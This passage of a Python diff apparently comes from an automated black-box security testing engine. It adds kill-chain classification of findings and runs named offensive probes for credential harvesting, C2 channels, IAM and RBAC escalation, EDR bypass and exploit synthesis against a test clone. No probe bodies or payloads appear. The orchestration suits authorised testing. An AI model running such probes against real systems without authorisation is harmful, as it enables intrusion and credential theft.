+            ("initial_access", {"credential_harvesting", "signature_bypass", "auth_bypass", "zero_day_discovery"}),
+            ("execution", {"exploit_synthesis", "bypass_weaponization"}),
+            ("persistence", {"c2_channel_viability"}),
+            ("privilege_escalation", {"cloud_iam_escalation", "rbac_escape", "ad_attack_path"}),
+            ("defense_evasion", {"edr_av_bypass", "dynamic_evasion", "ratelimit_bypass", "bypass_weaponization"}),
+            ("lateral_movement", {"id_guessing", "cross_subject_object_access", "cross_tenant_binding", "cross_identity_binding"}),
+            ("collection", {"entitlement_leak_to_unrelated_identity", "credential_harvesting"}),
+            ("exfiltration", {"c2_channel_viability", "credential_harvesting"}),
+        ]
+        finding_classes = {f.p0_class for f in actionable}
+        populated_stages: list[tuple[str, list[str]]] = []
+        affected_endpoints: set[str] = set()
+        for stage_name, stage_classes in _KILL_CHAIN:
+            hits = stage_classes & finding_classes
+            if hits:
+                populated_stages.append((stage_name, sorted(hits)))
+                for f in actionable:
+                    if f.p0_class in hits:
+                        affected_endpoints.update(r for r in f.reasons if not r.startswith("engine_"))
+        blast_radius = len(affected_endpoints)
+        chain_length = len(populated_stages)
+        if chain_length >= 3:
+            chain_desc = " -> ".join(f"{s}[{','.join(c)}]" for s, c in populated_stages)
+            return self._finding("PBB-E2E", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"End-to-end kill chain ({chain_length} stages, blast radius {blast_radius}): {chain_desc}",
+                                 reasons=[f"e2e_stage_{s}" for s, _ in populated_stages],
+                                 metrics={"chain_length": chain_length, "blast_radius": blast_radius,
+                                          "stages": [s for s, _ in populated_stages],
+                                          "stage_classes": {s: c for s, c in populated_stages}})
+        if populated_stages:
+            return self._finding("PBB-E2E", Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "low",
+                                 f"Partial kill chain ({chain_length} stages, blast radius {blast_radius}).",
+                                 reasons=[f"partial_e2e_{s}" for s, _ in populated_stages],
+                                 metrics={"chain_length": chain_length, "blast_radius": blast_radius})
+        return self._finding("PBB-E2E", Verdict.RULED_OUT, "medium",
+                             f"No connected kill-chain stages found from {len(actionable)} finding(s).",
+                             reasons=["no_e2e_chain"])
+
     async def run(self, experiments: Iterable[str] | None = None) -> EngineResult:
         started = now_iso()
         if self._enable_cold_discovery and not self.brief.operations:
@@ -3716,6 +4411,44 @@ class PureBlackBoxEngine:
                     pass
                 except Exception as exc:  # noqa: BLE001
                     findings.append(self._finding(_probe_hyp, Verdict.UNKNOWN, "low", f"Probe could not be completed ({type(exc).__name__}).", reasons=[f"engine_error:{type(exc).__name__}"]))
+                await self.ledger.flush_pending()
+        # B68-B80: offensive capability probes (test clone only)
+        _not_fast2 = not (self._find_fast and any(f.verdict is Verdict.CONFIRMED_P0 for f in findings))
+        for _probe_fn2, _probe_hyp2 in [
+            (self._digital_twin_probe, "PBB-TWIN"),
+            (self._credential_harvest_probe, "PBB-CRED"),
+            (self._ad_attack_path_probe, "PBB-ADPATH"),
+            (self._c2_channel_probe, "PBB-C2"),
+            (self._cloud_iam_escalation_probe, "PBB-IAM"),
+            (self._rbac_escape_probe, "PBB-RBAC"),
+            (self._bypass_weaponization_probe, "PBB-BPWPN"),
+            (self._reverse_engineering_probe, "PBB-REVENG"),
+            (self._zero_day_discovery_probe, "PBB-ZDAY"),
+            (self._edr_bypass_probe, "PBB-EDRBP"),
+            (self._dynamic_evasion_probe, "PBB-EVADE"),
+        ]:
+            if self._stop_reason() is None and _not_fast2:
+                try:
+                    if (_pf2 := await _probe_fn2(cs)) is not None:
+                        findings.append(_pf2)
+                except IdentityPoolExhausted:
+                    pass
+                except Exception as exc:  # noqa: BLE001
+                    findings.append(self._finding(_probe_hyp2, Verdict.UNKNOWN, "low", f"Probe could not be completed ({type(exc).__name__}).", reasons=[f"engine_error:{type(exc).__name__}"]))
+                await self.ledger.flush_pending()
+        # B77 + B80: synthesis probes that need the findings collected so far
+        for _synth_fn, _synth_hyp in [
+            (self._exploit_synthesis_probe, "PBB-XPLOIT"),
+            (self._e2e_chain_probe, "PBB-E2E"),
+        ]:
+            if self._stop_reason() is None and _not_fast2:
+                try:
+                    if (_sf := await _synth_fn(cs, findings)) is not None:
+                        findings.append(_sf)
+                except IdentityPoolExhausted:
+                    pass
+                except Exception as exc:  # noqa: BLE001
+                    findings.append(self._finding(_synth_hyp, Verdict.UNKNOWN, "low", f"Synthesis probe could not be completed ({type(exc).__name__}).", reasons=[f"engine_error:{type(exc).__name__}"]))
                 await self.ledger.flush_pending()
         guard = self._http.guard
         stats = {"customer_level_calls": self.rec.calls, "volunteered_hints_dropped": self.rec.hints_dropped, "hint_names_sample": list(self.rec.hint_samples),
